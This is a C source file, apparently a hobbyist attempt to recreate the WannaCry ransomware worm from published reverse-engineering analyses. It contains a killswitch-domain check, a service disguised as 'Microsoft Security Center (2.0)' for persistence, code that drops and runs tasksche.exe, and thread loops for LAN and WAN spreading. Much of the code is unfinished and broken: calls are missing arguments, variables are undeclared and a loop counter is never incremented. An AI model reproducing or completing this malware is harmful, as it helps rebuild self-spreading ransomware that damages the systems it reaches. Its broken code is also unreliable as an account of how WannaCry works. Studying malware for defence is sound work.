//https://medium.com/@yogeshojha/reverse-engineering-wannacry-ransomware-using-ghidra-finding-the-killswitch-a212807e9354
//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/

//Video: https://www.youtube.com/watch?v=Sv8yu12y5zM
//Video: https://www.youtube.com/watch?v=Q90uZS3taG0
//Video: https://www.youtube.com/watch?v=ru5VzUigKqw
//Help from:
//https://tech-zealots.com/threat-lab/dissecting-wannacry-ransomware-to-its-core-technical-analysis/
//https://www.youtube.com/watch?v=Sv8yu12y5zM
//https://www.microsoft.com/security/blog/2017/05/12/wannacrypt-ransomware-worm-targets-out-of-date-systems/
//https://blogs.windows.com/russia/2017/05/17/windows-vs-wannacrypt/

/* massive IDA screenshots & help from article:
https://www.programmersought.com/article/23574059266/
*/


#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

//globals
char executable_path[MAX_PATH]; //Get executable path 

//obtain the network card configuration and IP address details
int AdapterInfo()
{
	GetAdaptersInfo();
}

//not finished
int LAN_Spread()
{
	LOBYTE();
	AdapterInfo();
}

//not finished
void InitCryptoContext()
{
	CryptAcquireContextA(Unknown, NULL, UNK, UNK, &0xf0000000);
	InitializeCriticalSection(LPCRITICAL_SECTION, &UNKNOWN);
}

int initializeSockets()
{
	WSADATA WSAData;
	if(WSAStartup(MAKEWORD(2,2), &WSAData))
	{
		return 0;
	}
	InitCryptoContext(); //CryptAcquireContext
	initialize_payload();
}

int InitOperations()
{
	int result;
	int threadCount;
	result = initializeSockets();
	if(result)
	{
		hLanSpread = beginthreadex(0, 0, LAN_Spread, 0, 0, 0);
		if(hLanSpread)
		{
			CloseHandle(hLanSpread);
		}
		threadCount = 0;
		do
		{
			hWANSpread = beginthreadex(0, 0, WAN_Spread, threadCount, 0, 0);
			if(hWANSpread)
			{
				CloseHandle(hWANSpread);
			}
			Sleep(2000);
			hWANSpread++;
		} while (threadCount < 128);
		result = 0;
	}
	return result;
}

int create_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    char exec_with_args[260];
    
    sprintf(exec_with_args, "%s -m security", executable_path);
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(hSCManager != NULL)
    {
        //Fix this
        hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, &exec_with_args, NULL, NULL, NULL, NULL, NULL);
        if(hService != NULL)
        {
            StartServiceA(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
        return 0;
    }
       return 0;
}

//not finished 
int drop_tasksche()
{
    HANDLE hModule = GetModuleHandleW("kernel32.dll");
    HANDLE hFile;

    //fix these function definitions
    /*
    GetProcAddress(hModule, "CreateProcessA");
    GetProcAddress(hModule, "CreateFileA");
    GetProcAddress(hModule, "WriteFile");
    GetProcAddress(hModule, "CloseHandle");
    
    typedef BOOL (WINAPI *_CLOSEHANDLE)(HANDLE hObject);
    typedef HANDLE (WINAPI *_CREATEFILEW)(LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

    fCloseHandle = (_CLOSEHANDLE)GetProcAddress(hModule, CLOSEHANDLE, 0);
    fCreateFile = (_CREATEFILEW)GetProcAddress(hModule, CREATEFILEW, 0);
    
    */
    //copied from: https://github.com/gbmaster/loadLibrary/blob/master/kernel32.cpp
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    DWORD nNumberOfBytesWritten;
    
    HRSRC hResInfo = FindResourceA(0, 1831, "UNK");
    HGLOBAL hResData = LoadResource(0, hResInfo);
    PVOID lpBuffer = LockResource(hResData);
    DWORD nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
    char szFileName[] = "tasksche.exe";
    char szPath[MAX_PATH];
    char szNewPath[MAX_PATH];
    sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
    sprintf(szPath, "C:\\%s\\qeriuwjhrf", "WINDOWS");
    //MoveFileExA(szPath, szNewPath, REPLACE_EXISTING);
    MoveFileExA(szPath, szNewPath, 1);
    //GENERIC_WRITE is 0x40000000
    //CreateFileA(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, SYSTEM, NULL);
    hFile = CreateFileA(szPath, 0x40000000, 0, 0, 2, 4, 0);
    if(hFile != INVALID_HANDLE_VALUE)
    {
        WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesWritten, 0);
        CloseHandle(hFile);
    }
    //add the /i parameter to the end of tasksche
    strcat(szPath, " /i");
    //run tasksche with /i parameters
    if(CreateProcessA(NULL, szPath, 0, 0, 0, 0x8000000, 0, 0, &pi, &si))
    {
        CloseHandle(hFile);
        CloseHandle(hModule);
    }
}

int no_argument_handler()
{
    create_service();
    drop_tasksche();
}

//Not finished yet, must be fixed for this to work
SERVICE_STATUS_HANDLE ServiceMain()
{
	SERVICE_STATUS_HANDLE result;
	
	ServiceStatus.dwServiceType = 32;
	ServiceStatus.dwCurrentState = 2;
	ServiceStatus.dwControlsaccepted = 1;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;

	result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
	if(result)
	{
		ServiceStatus.dwCurrentState = 4;
		ServiceStatus.dwCheckPoint = 4;
		Servicestatus.dwWaitHint = 0;
		SetServicestatus(result, &ServiceStatus);
		InitOperations();
		Sleep(86400000);
		ExitProcess(1);
	}
	return result;
}

//https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
//https://github.com/StefanoBelli/lol/blob/92fd0e349ac42eb71ae9a1302559567cca64c0a1/Win32/ServiceLauncher.c
//https://github.com/sagishahar/scripts/blob/master/windows_service.c
//IDA screenshots: https://www.programmersought.com/article/23574059266/
int RealMain()
{
  SC_HANDLE hSCManager;
  SC_HANDLE SCObject;
  SERVICE_TABLE_ENTRYA ServiceStartTable;
  int *argc;
  char szName[] = "MSSecSvc";
  GetModuleFileName(NULL, &executable_path, sizeof(executable_path));
  
  argc = (int*)__p__argc();
  if(*argc < 2)
  {
     no_argument_handler();
  }
  
  /* https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
  hSCManager = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
  
  if(!hSCManager)
  {
    hSCObject = OpenServiceA(hSCManager, szName, SERVICE_START);
    if(!hSCObject)
    {
      //sub_407FA0 hSCObject, 0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServicehandle(hSCManager);
  }
  
  ServiceStartTable.lpServiceName = "MSSecSvc 2.0";
  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION) ServiceMain;

  return StartServiceCtrlDispatcher(&ServiceStartTable);

  //CloseServiceHandle(hSCManager);
  //CloseServiceHandle(SCObject);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    char szUrl[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
    HINTERNET hInternet;
    HINTERNET hUrl;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hUrl = InternetOpenUrl(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
    if (hUrl)
    {
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInternet);
      return 0;
    }
    else {
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInternet);
      RealMain();
    }
    return 0;
}
